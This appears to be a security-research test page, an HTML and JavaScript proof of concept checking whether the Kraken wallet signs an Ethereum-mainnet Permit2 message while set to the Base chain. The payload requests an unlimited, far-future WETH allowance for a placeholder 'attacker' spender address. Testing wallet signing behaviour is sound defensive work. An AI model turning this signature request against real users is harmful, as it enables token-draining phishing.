<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Kraken Permit2 ChainId Mismatch Test</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; padding: 16px; line-height: 1.45; }
    button { display: block; margin: 10px 0; padding: 12px; font-size: 16px; width: 100%; }
    pre { background: #f4f4f4; border: 1px solid #ddd; padding: 12px; white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h1>Kraken Permit2 ChainId Mismatch Test</h1>

  <button id="connect">1. Connect</button>
  <button id="switchBase">2. Switch active chain to Base 0x2105</button>
  <button id="signPermit2">3. Sign Ethereum Mainnet Permit2 typed data</button>

  <pre id="log"></pre>

  <script>
    let account = null;

    const BASE_CHAIN_ID_HEX = "0x2105";
    const ETH_MAINNET_CHAIN_ID = 1;

    // Official Uniswap Permit2 address on Ethereum mainnet.
    const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

    // Ethereum mainnet WETH token address from Uniswap Ethereum deployments.
    const WETH_MAINNET = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

    // Attacker-controlled spender placeholder.
    const ATTACKER_SPENDER = "0x1111111111111111111111111111111111111111";

    // Permit2 PermitDetails.amount is uint160.
    const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";

    // Far-future values within uint48 / uint256 ranges.
    const MAX_UINT48_SAFE = "281474976710655";
    const FAR_SIG_DEADLINE = "4102444800";

    function log(...x) {
      const line = x.map(v => {
        try {
          if (typeof v === "object") return JSON.stringify(v, null, 2);
          return String(v);
        } catch (_) {
          return String(v);
        }
      }).join(" ");
      document.getElementById("log").textContent += line + "\n";
      console.log(line);
    }

    async function waitEthereum() {
      while (!window.ethereum) {
        await new Promise(r => setTimeout(r, 25));
      }
      return window.ethereum;
    }

    async function connect() {
      const provider = await waitEthereum();
      const accounts = await provider.request({ method: "eth_requestAccounts" });
      account = accounts[0];

      log("Connected account:", account);
      log("Initial active chain:", await provider.request({ method: "eth_chainId" }));
    }

    async function switchBase() {
      const provider = await waitEthereum();

      log("Switching active chain to Base:", BASE_CHAIN_ID_HEX);

      try {
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BASE_CHAIN_ID_HEX }]
        });

        const active = await provider.request({ method: "eth_chainId" });
        log("Active chain after switch:", active);

        if (active.toLowerCase() === BASE_CHAIN_ID_HEX.toLowerCase()) {
          log("BASE_SWITCH_OK");
        } else {
          log("BASE_SWITCH_NOT_CONFIRMED");
        }
      } catch (e) {
        log("switchBase error:", e.message || String(e));
        if (e.code !== undefined) log("error.code:", e.code);
      }
    }

    async function signPermit2MainnetWhileOnBase() {
      const provider = await waitEthereum();

      if (!account) {
        await connect();
      }

      const activeChainBefore = await provider.request({ method: "eth_chainId" });

      const typedData = {
        types: {
          EIP712Domain: [
            { name: "name", type: "string" },
            { name: "chainId", type: "uint256" },
            { name: "verifyingContract", type: "address" }
          ],
          PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" }
          ],
          PermitSingle: [
            { name: "details", type: "PermitDetails" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" }
          ]
        },
        primaryType: "PermitSingle",
        domain: {
          name: "Permit2",
          chainId: ETH_MAINNET_CHAIN_ID,
          verifyingContract: PERMIT2
        },
        message: {
          details: {
            token: WETH_MAINNET,
            amount: MAX_UINT160,
            expiration: MAX_UINT48_SAFE,
            nonce: "0"
          },
          spender: ATTACKER_SPENDER,
          sigDeadline: FAR_SIG_DEADLINE
        }
      };

      log("=== Permit2 active-chain/domain-chain mismatch test ===");
      log("Active provider chain before signing:", activeChainBefore);
      log("Typed-data domain.name:", typedData.domain.name);
      log("Typed-data domain.chainId:", typedData.domain.chainId);
      log("Typed-data verifyingContract:", typedData.domain.verifyingContract);
      log("Permit token:", typedData.message.details.token);
      log("Permit amount uint160:", typedData.message.details.amount);
      log("Permit expiration uint48:", typedData.message.details.expiration);
      log("Permit nonce:", typedData.message.details.nonce);
      log("Permit spender:", typedData.message.spender);
      log("Permit sigDeadline:", typedData.message.sigDeadline);
      log("Expected secure behavior: reject or show critical mismatch warning because active chain != domain.chainId.");

      try {
        const sig = await provider.request({
          method: "eth_signTypedData_v4",
          params: [account, JSON.stringify(typedData)]
        });

        const domain = {
          name: typedData.domain.name,
          chainId: typedData.domain.chainId,
          verifyingContract: typedData.domain.verifyingContract
        };

        const types = {
          PermitDetails: typedData.types.PermitDetails,
          PermitSingle: typedData.types.PermitSingle
        };

        const recovered = ethers.verifyTypedData(domain, types, typedData.message, sig);

        log("SIGNATURE_RETURNED:");
        log(sig);
        log("RECOVERED_SIGNER:", recovered);

        const activeAfter = await provider.request({ method: "eth_chainId" });
        log("Active provider chain after signing:", activeAfter);

        if (
          activeChainBefore.toLowerCase() === BASE_CHAIN_ID_HEX.toLowerCase() &&
          typedData.domain.chainId === ETH_MAINNET_CHAIN_ID &&
          typedData.domain.verifyingContract.toLowerCase() === PERMIT2.toLowerCase() &&
          recovered.toLowerCase() === account.toLowerCase()
        ) {
          log("CANDIDATE: Kraken signed real Permit2-style Ethereum Mainnet typed data while active provider chain was Base 0x2105.");
        } else {
          log("NO_CANDIDATE_OR_NEEDS_REVIEW");
        }
      } catch (e) {
        log("eth_signTypedData_v4 error:", e.message || String(e));
        if (e.code !== undefined) log("error.code:", e.code);
        if (e.data !== undefined) log("error.data:", e.data);
      }
    }

    document.getElementById("connect").onclick = connect;
    document.getElementById("switchBase").onclick = switchBase;
    document.getElementById("signPermit2").onclick = signPermit2MainnetWhileOnBase;
  </script>
</body>
</html>
